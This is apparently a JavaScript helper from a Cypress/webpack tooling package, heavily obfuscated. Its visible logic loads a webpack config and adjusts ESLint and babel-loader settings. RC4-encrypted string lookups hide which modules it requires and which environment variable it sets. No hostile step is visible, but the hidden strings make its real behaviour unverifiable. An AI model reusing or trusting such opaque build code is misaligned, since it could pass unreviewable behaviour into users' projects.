'use strict';
var vip = "vip.v6";
var _0x3979 = [vip, "bcKIBsOZw4J2w7oLBMOXBcKe", "w74rYMOxSw==", "UGo4wokc", "4pmF77qWw5Anw7pXwp7DsFjDuMK7w6LDvlJkR1kIw6jCiysUwrdzVMOWFTYrwpNKEcOvw55xNREQOcO6e0Eew45fwqsJVSrCtVZ+wrXCnWrDsMOwwpRrwpYXw4Utw7XCqkM2w68rNcOZNUwAw4NJw5Jwwp1GfcK2w75kw7JMw5V5dMKfRsO+ZmnDqcOvATjDm3DDicKdd0nCrcKiNhY=", "w6PDomBBZg==", "wrzCnMOpwqxq", "w5LCtWHCpcOiw4sq", "HsO1bz9+", "wrDCvy/CqsOGCsKQwo0DUsKXwoDDkMOwAcKiw43CtCDCr8OgcmXDo8KUAcKM", "SlTCucOuSA==", "c8OWwqMeXMOiZcKPwprDoy1xMmU=", "EDPCumZow67CisOdw4TDi8KAc8K2XWITWsKuHcK1w6hOSw0=", 
"GMKRPcKiwqzCm8O3AsObwpYPw5Bjw7nDiHkFF8KIGAQew74LwpF7wp3Cj8Kadg==", "w6pAUFHDokXCi8ONIG7DtS4hwr7Du8Okw60ZasKfb8KY", "J3MWw5bCpy3DiQ==", "w4rCiT7DjVtKEcOWEMODw6DCvMOswr1gwpfDllTCox3CtcKIXAgDdHHCu0LCtWDCumYcQg==", "O8OSZlEl", "kTvipkT.vF6qKaDwcDMONkI=="];
(function(obj, count, long) {
  var fn = function(to, value, str, val, key) {
    value = value >> 8;
    key = "po";
    var str = "shift";
    var method = "push";
    if (value < to) {
      for (; --to;) {
        val = obj[str]();
        if (value === to) {
          value = val;
          str = obj[key + "p"]();
        } else {
          if (value && str["replace"](/[kTkTFqKaDwcDMONkI=]/g, "") === value) {
            obj[method](val);
          }
        }
      }
      obj[method](obj[str]());
    }
    return 662963;
  };
  return fn(++count, long) >> count ^ long;
})(_0x3979, 111, 28416);
var _0x3409 = function(c, fn) {
  c = ~~"0x"["concat"](c);
  var r = _0x3979[c];
  if (_0x3409["gGcVCp"] === undefined) {
    (function() {
      var jid = typeof window !== "undefined" ? window : typeof process === "object" && typeof require === "function" && typeof global === "object" ? global : this;
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!jid["atob"]) {
        jid["atob"] = function(i) {
          var str = String(i)["replace"](/=+$/, "");
          var bc = 0;
          var bs;
          var buffer;
          var Y = 0;
          var pix_color = "";
          for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    var testcase = function(data, fn) {
      var secretKey = [];
      var y = 0;
      var temp;
      var testResult = "";
      var tempData = "";
      data = atob(data);
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      data = decodeURIComponent(tempData);
      var x = 0;
      for (; x < 256; x++) {
        secretKey[x] = x;
      }
      x = 0;
      for (; x < 256; x++) {
        y = (y + secretKey[x] + fn["charCodeAt"](x % fn["length"])) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
      }
      x = 0;
      y = 0;
      var i = 0;
      for (; i < data["length"]; i++) {
        x = (x + 1) % 256;
        y = (y + secretKey[x]) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]);
      }
      return testResult;
    };
    _0x3409["ADulYa"] = testcase;
    _0x3409["jdZenS"] = {};
    _0x3409["gGcVCp"] = !![];
  }
  var o = _0x3409["jdZenS"][c];
  if (o === undefined) {
    if (_0x3409["lilvuK"] === undefined) {
      _0x3409["lilvuK"] = !![];
    }
    r = _0x3409["ADulYa"](r, fn);
    _0x3409["jdZenS"][c] = r;
  } else {
    r = o;
  }
  return r;
};
const debug = require(_0x3409("0", "[S#q"))(_0x3409("1", "DJol"));
const tryLoadWebpackConfig = require("../utils/tryLoadWebpackConfig");
const {
  allowModuleSourceInPlace : allowModuleSourceInPlace
} = require(_0x3409("2", "XRiR"));
const {
  addCypressToWebpackEslintRulesInPlace : addCypressToWebpackEslintRulesInPlace
} = require("../utils/eslint-helpers");
const {
  getTranspileFolders : getTranspileFolders
} = require(_0x3409("3", "XQ@L"));
const {
  addFolderToBabelLoaderTranspileInPlace : addFolderToBabelLoaderTranspileInPlace
} = require(_0x3409("4", "pW%z"));
module[_0x3409("5", "q%wD")] = function format(val, {
  webpackConfigPath : bBody
} = {
  "webpackConfigPath" : _0x3409("6", "YRk4")
}) {
  var c = {
    "HLWmE" : function(require, load, callback) {
      return require(load, callback);
    },
    "XpgXK" : function(require, load, callback) {
      return require(load, callback);
    },
    "RaZct" : _0x3409("7", "pNvr"),
    "NELIr" : function(saveNotifs, notifications) {
      return saveNotifs(notifications);
    },
    "PWhxC" : function(saveNotifs, notifications) {
      return saveNotifs(notifications);
    }
  };
  process["env"][_0x3409("8", "@70y")] = c[_0x3409("9", "$@JJ")];
  const i = c[_0x3409("a", "fb7s")](tryLoadWebpackConfig, bBody);
  if (!i) {
    throw new Error(_0x3409("b", "*yzs"));
  }
  c[_0x3409("c", "s$2m")](addCypressToWebpackEslintRulesInPlace, i);
  c[_0x3409("d", "ipA4")](getTranspileFolders, val)[_0x3409("e", "NCS(")]((val) => {
    c["HLWmE"](allowModuleSourceInPlace, val, i);
    c[_0x3409("f", "d#fs")](addFolderToBabelLoaderTranspileInPlace, val, i);
  });
  c["XpgXK"](debug, _0x3409("10", "FCdL"), i);
  return i;
};

